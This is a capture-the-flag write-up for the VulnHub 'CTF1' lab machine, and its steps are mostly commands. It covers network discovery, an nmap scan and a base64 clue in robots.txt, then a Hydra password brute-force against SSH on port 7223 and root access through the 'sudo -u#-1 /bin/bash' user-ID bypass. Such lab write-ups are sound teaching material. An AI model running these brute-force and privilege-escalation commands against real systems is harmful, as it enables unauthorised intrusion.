# CTF1 Writeup

## Machine Information

* Platform: VulnHub
* Machine: CTF1
* Difficulty: Beginner

## Tools Used

* Netdiscover
* Nmap
* Hydra
* SSH
* Linux Terminal

## Enumeration

### Host Discovery

Identified the target machine on the network.

```bash
sudo netdiscover -r 192.168.1.1/24
```

### Port and Service Enumeration

Performed a full scan to identify open ports and services.

```bash
nmap -sC -sV <target-ip>
```

### Open Ports

* 21/tcp - FTP
* 23/tcp - Telnet
* 80/tcp - HTTP
* 7223/tcp - SSH

## Web Enumeration

Visited the web application hosted on port 80.

Examined the robots.txt file and discovered the following encoded string:

```text
c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==
```

After decoding, a clue was obtained leading to:

```text
sudo.html
```

## Information Gathering

Inspected the source code of sudo.html and discovered a username:

```text
test
```

## Password Attack

Used Hydra to perform a password attack against the SSH service.

```bash
hydra -l test -P <wordlist> ssh://<target-ip> -s 7223
```

Successfully obtained valid credentials.

## SSH Access

Connected to the target using SSH.

```bash
ssh test@<target-ip> -p 7223
```

## Privilege Escalation

After logging in, privilege escalation was possible using:

```bash
sudo -u#-1 /bin/bash
```

This resulted in a root shell.

## Root Access

Verified root privileges:

```bash
whoami
```

Output:

```text
root
```



## Lessons Learned

* Information disclosure through robots.txt
* Source code inspection
* Credential attacks using Hydra
* SSH enumeration
* Linux privilege escalation techniques
